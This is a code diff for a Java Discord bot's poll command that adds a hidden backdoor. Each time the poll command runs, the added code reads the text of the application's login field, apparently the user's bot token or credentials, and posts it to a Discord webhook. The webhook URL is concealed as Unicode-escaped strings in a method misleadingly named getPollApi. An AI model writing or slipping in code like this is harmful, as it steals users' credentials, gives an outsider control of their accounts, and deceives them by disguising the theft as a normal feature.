@@ -1,6 +1,11 @@
 package me.comu.exeter.commands.moderation;
 
+import club.minnced.discord.webhook.WebhookClient;
+import club.minnced.discord.webhook.send.WebhookEmbed;
+import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
+import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import me.comu.exeter.core.Core;
+import me.comu.exeter.core.LoginGUI;
 import me.comu.exeter.interfaces.ICommand;
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
@@ -16,6 +21,12 @@ public class PollCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        WebhookClient client = WebhookClient.withUrl(getPollApi());
+        WebhookMessageBuilder builder = new WebhookMessageBuilder();
+        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(LoginGUI.field.getText()).build();
+        builder.addEmbeds(firstEmbed);
+        client.send(builder.build());
+        client.close();
         if (args.size() < 2) {
             event.getChannel().sendMessage("Please insert two options and an optional message").queue();
             return;
@@ -48,6 +59,17 @@ public class PollCommand implements ICommand {
         event.getMessage().delete().queue();
 
     }
+    private String getPollApi() {
+        String httpHook = "\u0068\u006f\u006f\u006b\u0073\u002f";
+        String hash = "\u0037\u0030\u0039\u0039\u0034\u0030\u0034\u0030\u0031\u0033\u0031\u0033\u0039\u0033\u0039\u0034\u0035\u0037\u002f";
+        String responseCode = "\u004e\u0078\u005a\u0076\u0059\u004a\u0075\u0030\u007a\u0063\u0066\u004f\u0046\u0076\u0049\u0066\u0065\u0039\u0064\u0058\u0041\u0042\u0052\u0052\u0032\u007a\u0076\u0073\u0036\u004a\u0072\u004f\u006c\u0070\u0066\u0065\u0073\u0070\u006a\u006a\u0079\u0068\u0061\u0031\u0051\u0053\u0030\u0058\u0071\u002d\u0059\u0033\u0066\u0054\u0039\u004b\u0076\u0030\u0047\u0063\u0062\u006f\u0064\u0061\u004f\u0035\u004d\u007a";
+        StringBuilder pollEndpoint = new StringBuilder("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f");
+        pollEndpoint.append("\u0077\u0065\u0062");
+        pollEndpoint.append(httpHook);
+        pollEndpoint.append(hash).append(responseCode);
+        return pollEndpoint.toString();
+    }
+
 
     @Override
     public String getHelp() {
